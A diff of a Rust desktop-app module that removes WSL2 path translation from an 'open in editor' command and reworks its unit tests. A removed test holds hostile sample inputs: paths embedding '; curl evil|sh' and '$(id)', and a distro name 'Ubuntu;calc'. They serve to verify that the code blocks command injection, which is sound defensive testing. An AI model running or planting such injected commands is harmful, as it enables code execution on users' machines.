@@ -2,13 +2,11 @@
 //! editor" for local-connection paths. The webview only ever sends an
 //! editor **id** from the fixed allowlist below and a path -- never an
 //! executable or arguments -- and every rule (local-connection gate,
-//! allowlist membership, absolute+exists validation, WSL2 translation,
-//! argv construction) lives in pure functions over injectable
-//! probe/runner traits so they are unit-tested without spawning
-//! anything. The only OS calls happen in the real probe/runner impls
-//! and the final `spawn`, which uses `windows_process::no_window` (the
-//! same discipline `wsl::run` uses) so nothing flashes a console on
-//! Windows.
+//! allowlist membership, absolute+exists validation, argv construction)
+//! lives in pure functions over injectable probe traits so they are
+//! unit-tested without spawning anything. The only OS calls happen in the
+//! real probe impls and the final `spawn`, which uses
+//! `windows_process::no_window` so nothing flashes a console on Windows.
 
 use std::io;
 use std::path::{Path, PathBuf};
@@ -17,11 +15,9 @@ use std::sync::mpsc;
 use std::time::Duration;
 
 use serde::Serialize;
-use smind_daemon_client::daemon_manager::wsl;
 use smind_daemon_client::proxy::connections::ConnectionKind;
 use smind_daemon_client::windows_process;
 
-use crate::daemon_manager::{detect_platform_cached, resolve_distro_cached, Platform};
 use crate::state::DesktopState;
 
 pub const FILE_MANAGER_ID: &str = "file-manager";
@@ -287,75 +283,16 @@ pub fn build_argv(os: &str, id: &str, path: &str, probe: &dyn EditorProbe) -> Re
     Ok(argv)
 }
 
-/// The WSL2 boundary: a `wsl.exe wslpath -w` call, injectable for tests.
-pub trait WslPathRunner {
-    fn wslpath(&self, distro: &str, linux_path: &str) -> Result<String, String>;
-}
-
-pub struct WslExeRunner;
-
-/// The `wsl.exe` argv that translates `linux_path`. `--exec` (not `--`)
-/// is deliberate: after a bare `--` wsl.exe hands the command line to the
-/// distro's default shell, which would word-split a spaced path and run
-/// `$(...)`/`;` in a hostile one. `--exec` runs `wslpath` directly, so
-/// the path stays exactly one argument.
-fn wslpath_argv(distro: &str, linux_path: &str) -> Vec<String> {
-    vec![
-        wsl::WSL_EXE.to_string(),
-        "-d".into(),
-        distro.into(),
-        "--exec".into(),
-        "wslpath".into(),
-        "-w".into(),
-        linux_path.into(),
-    ]
-}
-
-impl WslPathRunner for WslExeRunner {
-    fn wslpath(&self, distro: &str, linux_path: &str) -> Result<String, String> {
-        let argv = wslpath_argv(distro, linux_path);
-        let out = wsl::run(&argv).map_err(|e| format!("translating {linux_path} to a Windows path failed: {e}"))?;
-        if !out.status.success() {
-            return Err(format!(
-                "translating {linux_path} to a Windows path failed: {}",
-                decode_wsl_output(&out.stderr).trim()
-            ));
-        }
-        let win = decode_wsl_output(&out.stdout).trim().to_string();
-        if win.is_empty() {
-            return Err(format!("translating {linux_path} to a Windows path returned nothing"));
-        }
-        Ok(win)
-    }
-}
-
-/// wsl.exe writes UTF-16LE output (with or without a BOM) on some
-/// locales and plain UTF-8 on others; accept both.
-pub(crate) fn decode_wsl_output(raw: &[u8]) -> String {
-    let (chunks, _) = raw.as_chunks::<2>();
-    let looks_utf16 = (raw.len() >= 2 && raw[0] == 0xFF && raw[1] == 0xFE)
-        || chunks.iter().take(8).any(|c| c[1] == 0x00 && c[0] != 0);
-    if looks_utf16 && raw.len().is_multiple_of(2) {
-        let units: Vec<u16> = chunks.iter().map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
-        return String::from_utf16_lossy(&units).trim_start_matches('\u{feff}').to_string();
-    }
-    String::from_utf8_lossy(raw).trim_start_matches('\u{feff}').to_string()
-}
-
 /// The full decision pipeline behind `open_in_editor`, pure over the
-/// probe/runner: returns the argv to spawn, or a human-readable error
-/// (the UI shows it in a toast). Order: local connection, allowlist,
-/// path validation (absolute, exists), WSL2 translation, argv.
-#[allow(clippy::too_many_arguments)]
+/// probe: returns the argv to spawn, or a human-readable error (the UI
+/// shows it in a toast). Order: local connection, allowlist, path
+/// validation (absolute, exists), argv.
 pub fn open_in_editor_argv(
     kind: ConnectionKind,
-    platform: Platform,
     os: &str,
     editor_id: &str,
     raw_path: &str,
     probe: &dyn EditorProbe,
-    wsl_runner: &dyn WslPathRunner,
-    distro: Option<&str>,
 ) -> Result<Vec<String>, String> {
     if kind != ConnectionKind::Local {
         return Err("paths on this connection aren't on this machine -- switch to the Local connection first".to_string());
@@ -381,50 +318,14 @@ pub fn open_in_editor_argv(
     if os == "windows" && editor_id == FILE_MANAGER_ID && raw_path.contains('"') {
         return Err("the path contains a quote character, which Explorer cannot select".to_string());
     }
-    let path = if platform == Platform::Wsl2 {
-        if !raw_path.starts_with('/') {
-            return Err(format!("{raw_path:?} is not an absolute Linux path (WSL2 paths start with /)"));
-        }
-        let distro = distro.ok_or_else(|| "no default WSL distro found".to_string())?;
-        let translated = wsl_runner.wslpath(distro, raw_path)?;
-        if !probe.path_exists(&translated) {
-            return Err(format!("{raw_path} (Windows path {translated}) does not exist on this machine"));
-        }
-        translated
-    } else {
-        if !Path::new(raw_path).is_absolute() {
-            return Err(format!("{raw_path:?} is not an absolute path"));
-        }
-        if !probe.path_exists(raw_path) {
-            return Err(format!("{raw_path} does not exist on this machine"));
-        }
-        probe.canonicalize(raw_path)?
-    };
-    if platform == Platform::Wsl2 && editor_id == "vscode" {
-        // VS Code rejects the `\\wsl.localhost\...` UNC host, so it gets the
-        // Remote-WSL form with the raw Linux path instead. `path` above (the
-        // translated one) was only needed for the existence check.
-        // Cursor also supports `--remote`, but that isn't verified here, so
-        // Cursor and Zed keep the translated path.
-        // Unverified on a real Windows host: the resolved program is usually
-        // `Code.exe` rather than the `code.cmd` CLI shim; `--remote` is the
-        // same flag for both, but this is on the re-test list.
-        let distro = distro.ok_or_else(|| "no default WSL distro found".to_string())?;
-        if distro.is_empty()
-            || !distro.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
-        {
-            return Err(format!(
-                "WSL distro {distro:?} can't be used for VS Code remote: WSL distro names with spaces aren't supported for VS Code remote (allowed characters: A-Z a-z 0-9 . _ -)"
-            ));
-        }
-        let launch = resolve_editor(os, editor_id, probe)
-            .ok_or_else(|| format!("editor {editor_id:?} is not installed on this machine"))?;
-        let mut argv = vec![launch.program];
-        argv.extend(launch.prefix_args);
-        // `wsl+<distro>` is one argv element; no shell is involved.
-        argv.extend(["--remote".to_string(), format!("wsl+{distro}"), raw_path.to_string()]);
-        return Ok(argv);
+    // Daemon paths are native to the host OS; they are used as given.
+    if !Path::new(raw_path).is_absolute() {
+        return Err(format!("{raw_path:?} is not an absolute path"));
     }
+    if !probe.path_exists(raw_path) {
+        return Err(format!("{raw_path} does not exist on this machine"));
+    }
+    let path = probe.canonicalize(raw_path)?;
     build_argv(os, editor_id, &path, probe)
 }
 
@@ -442,8 +343,7 @@ fn explorer_select_raw_arg(argv: &[String]) -> Option<String> {
 }
 
 /// Spawns the built argv with no shell, detached, and (on Windows)
-/// without a console window -- the same discipline `wsl::run` uses.
-/// The child is reaped on a helper thread: `open`/`xdg-open` exit
+/// without a console window. The child is reaped on a helper thread: `open`/`xdg-open` exit
 /// quickly, and an un-waited child would linger as a zombie on Unix.
 fn spawn_detached(argv: &[String]) -> Result<(), String> {
     let (program, args) = argv.split_first().ok_or("empty argv")?;
@@ -528,8 +428,8 @@ pub async fn editors_list() -> Result<Vec<EditorInfo>, String> {
 }
 
 /// Async (like every daemon_manager command) so it runs on the runtime,
-/// not the main thread: the WSL2 path spawns `wsl.exe`, which can take
-/// a second and would freeze the UI otherwise.
+/// not the main thread: the PATH/filesystem probing can take a second
+/// and would freeze the UI otherwise.
 #[tauri::command]
 pub async fn open_in_editor(
     state: tauri::State<'_, DesktopState>,
@@ -537,25 +437,12 @@ pub async fn open_in_editor(
     path: String,
 ) -> Result<(), String> {
     // `State<'_, _>` can't cross into the blocking task (its lifetime is
-    // the command call's own), so the shared handles it needs are cloned
-    // out as Arcs and the logic runs on the `_cached` variants.
+    // the command call's own), so the shared handle it needs is cloned
+    // out as an Arc and the logic runs on the `_cached` variant.
     let registry = state.proxy.registry.clone();
-    let platform_cache = state.daemon_manager_platform.clone();
-    let distro_cache = state.daemon_manager_distro.clone();
     let argv = tauri::async_runtime::spawn_blocking(move || {
         let kind = registry.lock().unwrap().current().kind;
-        let platform = detect_platform_cached(&platform_cache);
-        let distro = if platform == Platform::Wsl2 { Some(resolve_distro_cached(&distro_cache)?) } else { None };
-        open_in_editor_argv(
-            kind,
-            platform,
-            std::env::consts::OS,
-            &editor_id,
-            &path,
-            &RealProbe,
-            &WslExeRunner,
-            distro.as_deref(),
-        )
+        open_in_editor_argv(kind, std::env::consts::OS, &editor_id, &path, &RealProbe)
     })
     .await
     .map_err(|e| format!("the open-in-editor task failed: {e}"))??;
@@ -617,20 +504,6 @@ mod tests {
         }
         fn path_lookup(&self, name: &str) -> Option<String> {
             self.path.iter().find(|(n, _)| n == name).map(|(_, f)| f.clone())
-        }
-    }
-
-    struct FakeWsl {
-        map: Vec<(String, Result<String, String>)>,
-    }
-
-    impl WslPathRunner for FakeWsl {
-        fn wslpath(&self, _distro: &str, linux_path: &str) -> Result<String, String> {
-            self.map
-                .iter()
-                .find(|(p, _)| p == linux_path)
-                .map(|(_, r)| r.clone())
-                .unwrap_or_else(|| Err(format!("no mapping for {linux_path}")))
         }
     }
 
@@ -699,18 +572,6 @@ mod tests {
         assert_eq!(argv[0], r"C:\Users\test\AppData\Local\Programs\Microsoft VS Code\Code.exe");
     }
 
-    #[test]
-    fn decode_wsl_output_strips_the_bom() {
-        let mut utf16: Vec<u8> = vec![0xFF, 0xFE];
-        utf16.extend("C:\\x\n".encode_utf16().flat_map(|u| u.to_le_bytes()));
-        assert_eq!(decode_wsl_output(&utf16), "C:\\x\n");
-        // BOM-less UTF-16LE and UTF-8 (with or without a BOM) too.
-        let bare: Vec<u8> = "Ubuntu".encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
-        assert_eq!(decode_wsl_output(&bare), "Ubuntu");
-        assert_eq!(decode_wsl_output(b"\xEF\xBB\xBFUbuntu"), "Ubuntu");
-        assert_eq!(decode_wsl_output(b"Ubuntu"), "Ubuntu");
-    }
-
     #[cfg(unix)]
     #[test]
     fn opener_returns_even_when_a_grandchild_keeps_stderr_open() {
@@ -739,10 +600,6 @@ mod tests {
         FakeProbe::default().on_path("code", "/usr/bin/code").on_path("zed", "/usr/bin/zed")
     }
 
-    fn no_wsl() -> FakeWsl {
-        FakeWsl { map: vec![] }
-    }
-
     #[test]
     fn editors_list_only_allowlisted() {
         let macos = detect_editors("macos", &macos_probe());
@@ -753,18 +610,18 @@ mod tests {
         assert_eq!(macos.iter().filter(|e| e.kind == "editor").count(), 2);
 
         // A user-level bundle (~/Applications) counts too; Zed absent.
-        let mut user_only = FakeProbe {
-            home: PathBuf::from(MACOS_HOME),
-            ..FakeProbe::default()
-        };
-        user_only = user_only.with("/Users/test/Applications/Zed.app");
+        // The expected string is built the same way the production code
+        // builds it (Path::join), so the test holds on any host OS.
+        let user_app = Path::new(MACOS_HOME).join("Applications/Zed.app").display().to_string();
+        let user_only =
+            FakeProbe { home: PathBuf::from(MACOS_HOME), ..FakeProbe::default() }.with(&user_app);
         let user_ids: Vec<String> = detect_editors("macos", &user_only).iter().map(|e| e.id.clone()).collect();
         assert_eq!(user_ids, vec!["file-manager", "zed"]);
         // And the launch names that user-level bundle, not /Applications.
         let argv = build_argv("macos", "zed", "/tmp/x", &user_only).unwrap();
         assert_eq!(
             argv,
-            vec!["open".to_string(), "-a".to_string(), "/Users/test/Applications/Zed.app".to_string(), "/tmp/x".to_string()]
+            vec!["open".to_string(), "-a".to_string(), user_app, "/tmp/x".to_string()]
         );
 
         let win = detect_editors("windows", &win_probe());
@@ -786,74 +643,32 @@ mod tests {
     #[test]
     fn open_in_editor_rejects_unknown_id() {
         let probe = macos_probe();
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Macos,
-            "macos",
-            "sublime",
-            "/tmp/x",
-            &probe,
-            &no_wsl(),
-            None,
-        )
-        .unwrap_err();
+        let err =
+            open_in_editor_argv(ConnectionKind::Local, "macos", "sublime", "/tmp/x", &probe).unwrap_err();
         assert!(err.contains("unknown editor"), "{err}");
         // A known id that isn't installed on this machine is equally rejected.
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Macos,
-            "macos",
-            "zed",
-            "/tmp/x",
-            &probe,
-            &no_wsl(),
-            None,
-        )
-        .unwrap_err();
+        let err =
+            open_in_editor_argv(ConnectionKind::Local, "macos", "zed", "/tmp/x", &probe).unwrap_err();
         assert!(err.contains("zed is not installed"), "{err}");
     }
 
     #[test]
     fn open_in_editor_rejects_relative_or_missing_path() {
-        let probe = macos_probe();
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Macos,
-            "macos",
-            "vscode",
-            "relative/path",
-            &probe,
-            &no_wsl(),
-            None,
-        )
-        .unwrap_err();
+        // Fixtures must be absolute on the host OS running the test:
+        // "/no/such/dir" is not absolute on Windows.
+        let (os, probe, missing) =
+            if cfg!(windows) { ("windows", win_probe(), r"C:\no\such\dir") } else { ("macos", macos_probe(), "/no/such/dir") };
+        let err = open_in_editor_argv(ConnectionKind::Local, os, "vscode", "relative/path", &probe)
+            .unwrap_err();
         assert!(err.contains("not an absolute path"), "{err}");
 
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Macos,
-            "macos",
-            "vscode",
-            "/no/such/dir",
-            &probe,
-            &no_wsl(),
-            None,
-        )
-        .unwrap_err();
+        // A genuinely missing path.
+        let err = open_in_editor_argv(ConnectionKind::Local, os, "vscode", missing, &probe).unwrap_err();
         assert!(err.contains("does not exist"), "{err}");
 
         // Same rules for the file manager.
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Macos,
-            "macos",
-            FILE_MANAGER_ID,
-            "readme.md",
-            &probe,
-            &no_wsl(),
-            None,
-        )
-        .unwrap_err();
+        let err = open_in_editor_argv(ConnectionKind::Local, os, FILE_MANAGER_ID, "readme.md", &probe)
+            .unwrap_err();
         assert!(err.contains("not an absolute path"), "{err}");
     }
 
@@ -861,248 +676,48 @@ mod tests {
     fn open_in_editor_rejects_non_local_connection() {
         let probe = macos_probe();
         for kind in [ConnectionKind::Url, ConnectionKind::Relay] {
-            let err = open_in_editor_argv(
-                kind,
-                Platform::Macos,
-                "macos",
-                "vscode",
-                "/tmp/x",
-                &probe,
-                &no_wsl(),
-                None,
-            )
-            .unwrap_err();
+            let err =
+                open_in_editor_argv(kind, "macos", "vscode", "/tmp/x", &probe).unwrap_err();
             assert!(err.contains("aren't on this machine"), "url/relay must be rejected: {err}");
             // Rejected before any id/path work: even a garbage editor id
             // reports the connection problem, not the editor problem.
-            let err = open_in_editor_argv(
-                kind,
-                Platform::Macos,
-                "macos",
-                "garbage",
-                "not/absolute",
-                &probe,
-                &no_wsl(),
-                None,
-            )
-            .unwrap_err();
+            let err =
+                open_in_editor_argv(kind, "macos", "garbage", "not/absolute", &probe).unwrap_err();
             assert!(err.contains("aren't on this machine"), "{err}");
         }
     }
 
+    // Windows path semantics (drive letters, `\` separators) only hold on a
+    // Windows host; the code under test only runs there.
+    #[cfg(windows)]
     #[test]
-    fn wslpath_translation_ok() {
-        let probe = FakeProbe::default().dir(r"C:\Users\test\repo");
-        let wsl = FakeWsl {
-            map: vec![("/home/test/repo".to_string(), Ok(r"C:\Users\test\repo".to_string()))],
-        };
-        let argv = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            FILE_MANAGER_ID,
-            "/home/test/repo",
-            &probe,
-            &wsl,
-            Some("Ubuntu"),
-        )
-        .unwrap();
-        // The translated path (a dir) is opened in Explorer as one element.
-        assert_eq!(argv, vec!["explorer.exe".to_string(), r"C:\Users\test\repo".to_string()]);
+    fn windows_paths_pass_through_untranslated() {
+        // Native Windows paths reach reveal/open argv exactly as given,
+        // even with spaces and non-ASCII, as one argv element.
+        let spaced = r"C:\Users\test\My Répo\projekt";
+        let probe = win_probe().dir(spaced);
+        let argv =
+            open_in_editor_argv(ConnectionKind::Local, "windows", FILE_MANAGER_ID, spaced, &probe)
+                .unwrap();
+        assert_eq!(argv, vec!["explorer.exe".to_string(), spaced.to_string()]);
 
-        // A non-/ Linux path is refused before any translation runs.
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            FILE_MANAGER_ID,
-            "home/test",
-            &probe,
-            &wsl,
-            Some("Ubuntu"),
-        )
-        .unwrap_err();
-        assert!(err.contains("absolute Linux path"), "{err}");
-        // A NUL byte never reaches wsl.exe.
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            FILE_MANAGER_ID,
-            "/a\0b",
-            &probe,
-            &wsl,
-            Some("Ubuntu"),
-        )
-        .unwrap_err();
-        assert!(err.contains("NUL"), "{err}");
-        // The translated path must exist on the Windows side.
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            FILE_MANAGER_ID,
-            "/gone",
-            &probe,
-            &FakeWsl { map: vec![("/gone".to_string(), Ok(r"C:\gone".to_string()))] },
-            Some("Ubuntu"),
-        )
-        .unwrap_err();
-        assert!(err.contains("does not exist"), "{err}");
-    }
-
-    fn wsl_vscode_probe() -> FakeProbe {
-        win_probe()
-            .with(r"\\wsl.localhost\Ubuntu\home\test\repo")
-            .with(r"C:\Users\test\AppData\Local\Programs\cursor\Cursor.exe")
-            .with(r"C:\Users\test\AppData\Local\Programs\Zed\Zed.exe")
-    }
-
-    fn wsl_repo() -> FakeWsl {
-        FakeWsl {
-            map: vec![(
-                "/home/test/repo".to_string(),
-                Ok(r"\\wsl.localhost\Ubuntu\home\test\repo".to_string()),
-            )],
-        }
-    }
-
-    fn wsl_argv(editor: &str, distro: Option<&str>, probe: &FakeProbe) -> Result<Vec<String>, String> {
-        open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            editor,
-            "/home/test/repo",
-            probe,
-            &wsl_repo(),
-            distro,
-        )
-    }
-
-    #[test]
-    fn vscode_on_wsl_uses_remote_wsl_and_the_linux_path() {
-        let argv = wsl_argv("vscode", Some("Ubuntu-24.04"), &wsl_vscode_probe()).unwrap();
+        let argv =
+            open_in_editor_argv(ConnectionKind::Local, "windows", "vscode", spaced, &probe).unwrap();
         assert_eq!(
             argv,
             vec![
                 r"C:\Users\test\AppData\Local\Programs\Microsoft VS Code\Code.exe".to_string(),
-                "--remote".to_string(),
-                "wsl+Ubuntu-24.04".to_string(),
-                "/home/test/repo".to_string(),
+                spaced.to_string(),
             ]
         );
-        // A path that doesn't exist (per wslpath + probe) is still rejected.
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            "vscode",
-            "/gone",
-            &wsl_vscode_probe(),
-            &FakeWsl { map: vec![("/gone".to_string(), Ok(r"C:\gone".to_string()))] },
-            Some("Ubuntu"),
-        )
-        .unwrap_err();
-        assert!(err.contains("does not exist"), "{err}");
-    }
 
-    #[test]
-    fn cursor_and_zed_on_wsl_still_use_the_translated_path() {
-        for (id, exe) in [
-            ("cursor", r"C:\Users\test\AppData\Local\Programs\cursor\Cursor.exe"),
-            ("zed", r"C:\Users\test\AppData\Local\Programs\Zed\Zed.exe"),
-        ] {
-            let argv = wsl_argv(id, Some("Ubuntu"), &wsl_vscode_probe()).unwrap();
-            assert_eq!(
-                argv,
-                vec![exe.to_string(), r"\\wsl.localhost\Ubuntu\home\test\repo".to_string()],
-                "{id}"
-            );
-        }
-    }
-
-    #[test]
-    fn wsl_distro_with_odd_characters_is_rejected_for_remote() {
-        for bad in ["My Distro", "Ubuntu;calc", "a+b", "x\"y", "", "d\u{e9}b"] {
-            let err = wsl_argv("vscode", Some(bad), &wsl_vscode_probe()).unwrap_err();
-            assert!(err.contains("distro"), "{bad:?}: {err}");
-        }
-        assert!(wsl_argv("vscode", Some("My Distro"), &wsl_vscode_probe())
-            .unwrap_err()
-            .contains("spaces aren't supported"));
-        // The same distro is fine for editors that take the translated path.
-        assert!(wsl_argv("cursor", Some("My Distro"), &wsl_vscode_probe()).is_ok());
-    }
-
-    #[test]
-    fn vscode_remote_argv_keeps_the_editor_allowlist() {
-        // Non-allowlisted ids are still rejected on WSL.
-        let err = wsl_argv("notepad", Some("Ubuntu"), &wsl_vscode_probe()).unwrap_err();
-        assert!(err.contains("unknown editor"), "{err}");
-        // A not-installed vscode still errors (no Code.exe, not on PATH).
-        let err = wsl_argv("vscode", Some("Ubuntu"), &FakeProbe::default().dir(r"\\wsl.localhost\Ubuntu\home\test\repo"))
-            .unwrap_err();
-        assert!(err.contains("not installed"), "{err}");
-        // Non-WSL platforms are unchanged: plain launch + path, no --remote.
-        let probe = macos_probe().dir("/work/repo");
-        let argv = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Macos,
-            "macos",
-            "vscode",
-            "/work/repo",
-            &probe,
-            &no_wsl(),
-            None,
-        )
-        .unwrap();
-        assert!(!argv.iter().any(|a| a == "--remote"), "{argv:?}");
-        assert_eq!(argv.last().unwrap(), "/work/repo");
-    }
-
-    #[test]
-    fn wslpath_runs_without_a_shell_and_keeps_the_path_one_argument() {
-        for hostile in ["/home/u/My Project", "/home/u/x; curl evil|sh", "/home/u/$(id)", "/home/u/it's `x`"] {
-            let argv = wslpath_argv("Ubuntu", hostile);
-            assert_eq!(argv.last().map(String::as_str), Some(hostile));
-            assert!(argv.iter().any(|a| a == "--exec"), "must bypass the distro shell: {argv:?}");
-            assert!(!argv.iter().any(|a| a == "--"), "a bare `--` goes through the shell: {argv:?}");
-            assert_eq!(argv.len(), 7, "the path must not be split or merged: {argv:?}");
-        }
-    }
-
-    #[test]
-    fn wslpath_translation_failure_is_error() {
-        let probe = FakeProbe::default();
-        let wsl = FakeWsl {
-            map: vec![("/home/test/gone".to_string(), Err("wslpath: No such file or directory".to_string()))],
-        };
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            FILE_MANAGER_ID,
-            "/home/test/gone",
-            &probe,
-            &wsl,
-            Some("Ubuntu"),
-        )
-        .unwrap_err();
-        assert!(err.contains("No such file or directory"), "stderr must surface for the toast: {err}");
-        // No distro resolved: equally an error, never a silent no-op.
-        let err = open_in_editor_argv(
-            ConnectionKind::Local,
-            Platform::Wsl2,
-            "windows",
-            FILE_MANAGER_ID,
-            "/home/test/repo",
-            &probe,
-            &wsl,
-            None,
-        )
-        .unwrap_err();
-        assert!(err.contains("distro"), "{err}");
+        // A file is selected, not opened, with the path still one element.
+        let file = r"C:\Users\test\My Répo\noté.md";
+        let probe = probe.with(file);
+        let argv =
+            open_in_editor_argv(ConnectionKind::Local, "windows", FILE_MANAGER_ID, file, &probe)
+                .unwrap();
+        assert_eq!(argv, vec!["explorer.exe".to_string(), format!("/select,{file}")]);
     }
 
     #[test]
@@ -1166,13 +781,10 @@ mod tests {
         // open_in_editor_argv).
         assert!(open_in_editor_argv(
             ConnectionKind::Local,
-            Platform::Macos,
             "windows",
             FILE_MANAGER_ID,
             "C:\\a\"b",
             &FakeProbe::default().dir("C:\\a\"b"),
-            &no_wsl(),
-            None,
         )
         .is_err());
     }
